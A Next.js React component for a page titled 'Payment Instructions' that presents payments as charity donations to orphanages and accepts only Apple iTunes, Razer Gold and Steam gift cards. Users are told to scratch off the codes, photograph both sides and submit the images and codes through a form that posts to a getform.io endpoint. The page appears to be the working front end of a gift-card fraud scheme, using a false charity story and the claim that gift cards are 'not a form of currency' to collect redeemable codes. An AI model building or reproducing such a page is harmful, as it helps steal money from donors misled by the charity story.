/* eslint-disable @typescript-eslint/no-unused-vars */

"use client"

import Image from "next/image"

import { useState } from "react";
import { useRouter } from "next/navigation";

import "./globals.scss"

const RegPayment = () => {

    const router = useRouter();
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault();
        setLoading(true);
        setError(null);

        const formData = new FormData(event.currentTarget);

        try {
            const response = await fetch("https://getform.io/f/bqokegmb", {
                method: "POST",
                body: formData,
            });

            if (response.ok) {
                router.push("/");
                alert("Your application is being processed, you will recieve an email from our team")
            } else {
                setError("Submission failed. Please try again.");
            }
        } catch (err) {
            setError("An error occurred. Please try again.");
        } finally {
            setLoading(false);
        }
    };

    return (
        <main className="payment">
            <div>
                <Image
                    src={'/icons/payment.png'}
                    width={500}
                    height={700}
                    alt="payment"
                />
            </div>
            <div>
                <h2>Payment Instructions</h2>
                <p>All payments on this website would be made in the form of charity donations and channeled directly to the orphanage homes until further notice. Therefore, all payments would be made through gift cards, as they are not a form of currency or payment, but only a gifting method.</p>
                <div>
                    <h3>Payment Steps</h3>
                    <ul>
                        <li>Purchase a gift card from your preferred retailer</li>
                        <li>Accepted Gift Cards: Apple iTunes, Razer Gold, Steam.</li>
                        <li>Take clear and bright pictures of the front and back of cards.</li>
                        <li>Please ensure the gift card code is visible and not obscured.</li>
                        <li>Once we receive your payment, we will confirm and process your donation.</li>
                    </ul>
                </div>
                <div>
                    <p>Refer to this example of how the images you input should look like:</p>
                    <div>
                        <Image
                            src={'/icons/Apple front 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                        <Image
                            src={'/icons/Apple back 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                        <Image
                            src={'/icons/Razor front 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                        <Image
                            src={'/icons/Razor back 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                        <Image
                            src={'/icons/Steam front 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                        <Image
                            src={'/icons/Steam back 1.png'}
                            width={200}
                            height={200}
                            alt="apple front"
                        />
                    </div>
                    <p>Make sure to scratch the area gently to reveal the code in the box, make sure the code is visible and clear</p>
                </div>
                <form onSubmit={handleSubmit}>
                    <div>
                        <label htmlFor="giftCard">Image of Gift card</label>
                        <input
                            type="file"
                            name="giftCard"
                            accept="image/*"
                            multiple required
                        />
                    </div>
                    <div>
                        <label htmlFor="giftCode">Input Gift card code</label>
                        <input
                            type="text"
                            name="giftCode"
                            required
                        />
                    </div>
                    <div>
                        <label htmlFor="purpose">What charity are you donating to</label>
                        <input
                            type="text"
                            name="purpose"
                            required
                        />
                    </div>
                    <button type="submit" disabled={loading}>
                        {loading ? "Sending..." : "Send"}
                    </button>
                </form>
            </div>
        </main>
    )
}

export default RegPayment